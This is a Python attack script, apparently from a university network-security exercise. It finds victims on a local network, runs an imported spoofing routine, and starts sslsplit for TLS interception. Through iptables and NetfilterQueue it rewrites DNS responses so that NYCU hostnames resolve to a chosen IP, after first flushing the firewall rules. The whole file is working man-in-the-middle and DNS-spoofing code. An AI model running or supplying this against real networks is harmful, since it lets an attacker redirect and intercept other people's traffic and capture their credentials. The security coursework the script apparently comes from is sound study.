#!./.env/bin/python
import os
from utils import get_victims, trick, sslsplit
from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import threading
import time

hostDict = {
    b'www.nycu.edu.tw.': '140.113.207.241',
    b'nycu-nctu.cdn.hinet.net.': '140.113.207.241'
}

QUEUE_NUM = 2
nfqueue = NetfilterQueue()


def call_back(pkt: scapy.Packet):
    spkt: scapy.Packet = scapy.IP(pkt.get_payload())
    if spkt.haslayer(scapy.DNSRR):
        qname = spkt[scapy.DNSQR].qname
        if qname in hostDict:
            spkt[scapy.DNS].an = scapy.DNSRR(
                rrname=qname, rdata=hostDict[qname])
            spkt[scapy.DNS].ancount = 1
            del spkt[scapy.IP].len
            del spkt[scapy.IP].chksum
            del spkt[scapy.UDP].len
            del spkt[scapy.UDP].chksum
            pkt.set_payload(bytes(spkt))
        pkt.accept()
    else:
        pkt.accept()


def dns_spoof():
    time.sleep(1)
    os.system(
        f'iptables -I FORWARD -j NFQUEUE --queue-num {QUEUE_NUM}')
    nfqueue.bind(QUEUE_NUM, call_back)
    nfqueue.run()


def main():
    ips = get_victims()
    os.system('iptables -F')
    threads = list()
    threads.append(threading.Thread(target=trick, args=[ips]))
    threads.append(threading.Thread(target=sslsplit))
    threads.append(threading.Thread(target=dns_spoof))
    for t in threads:
        t.start()


if __name__ == '__main__':
    if os.geteuid() != 0:
        exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
    main()
